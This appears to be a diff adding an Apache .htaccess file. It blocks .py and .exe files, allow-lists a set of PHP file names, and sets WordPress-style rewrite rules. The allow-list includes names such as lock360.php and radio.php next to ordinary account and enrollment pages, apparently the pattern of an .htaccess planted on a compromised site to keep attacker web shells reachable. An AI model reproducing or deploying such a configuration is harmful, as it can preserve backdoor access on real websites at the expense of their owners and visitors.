@@ -1,0 +1,17 @@
+<FilesMatch ".(py|exe)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|register.php|logout.php|dashboard.php|activate.php|account-details.php|change-password.php|contact-support.php|current-enrollments.php|delete-enrollment.php|download.php|enrollment-step2.php|explanation.php|forgotton-password.php|getdata.php|my-enrollments.php|my-orders.php|orders.php|payment-history.php|reset-password.php|update_cities.php|update_states.php|uploaded_files.php|approval-pending.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+DirectoryIndex index.php dashboard.php
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
